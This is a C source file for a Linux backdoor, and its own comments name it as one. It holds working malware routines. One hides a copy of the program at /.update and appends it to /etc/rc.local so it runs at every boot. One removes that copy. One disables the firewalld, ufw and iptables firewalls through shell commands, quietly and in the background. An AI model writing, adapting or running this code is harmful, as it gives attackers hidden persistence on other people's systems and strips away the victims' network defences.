#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include "debug.h"

// Deletes the /.update file
void uninstall_backdoor() {
    remove("/.update");
}

// Makes sure that this backdoor will survive a reboot and always run on startup
void enable_persistence() {
    char buf[2048] = {0};
    FILE *f;
    char exists;

    // Check if the /.update program already exists. If it does already exist,
    // then we will assume that this program is already persistent and nothing
    // else needs to be done.
    exists = (access("/.update", F_OK) != -1);
    if(!exists) {
        // Copy this program to /.update and make sure it's executable
        debug_print("Copying program to the /.update file...\n");
        strcpy(buf, "cp ");
        readlink("/proc/self/exe", buf+strlen(buf), 1024);
        strcat(buf, " /.update >/dev/null 2>&1");
        system(buf);
        system("chmod +x /.update");

        // Add /.update to the /etc/rc.local file
        debug_print("Adding /.update to /etc/rc.local to always run on startup...\n");
        exists = (access("/etc/rc.local", F_OK) != -1);
        f = fopen("/etc/rc.local", "a");
        if(!exists) {
            fprintf(f, "#!/bin/bash\n");
            system("chmod +x /etc/rc.local >/dev/null 2>&1 &");
        }
        fprintf(f, "\n/.update &");
        fclose(f);
    }
}

// Will attempt to turn off the most common linux firewalls using various commands.
// Most likely, some of these commands may fail because the target may not have all of these types of firewalls enabled.
// These commands may also fail if we don't have root privileges.
void disable_firewalls() {
    const char cmds[] = "\
        { \
        systemctl disable firewalld; \
        ufw disable; \
        systemctl disable ufw; \
        service iptables stop; \
        chkconfig iptables off; \
        } >/dev/null 2>&1 &";
    debug_print("Attempting to disable firewalls...\n");
    system(cmds);
}
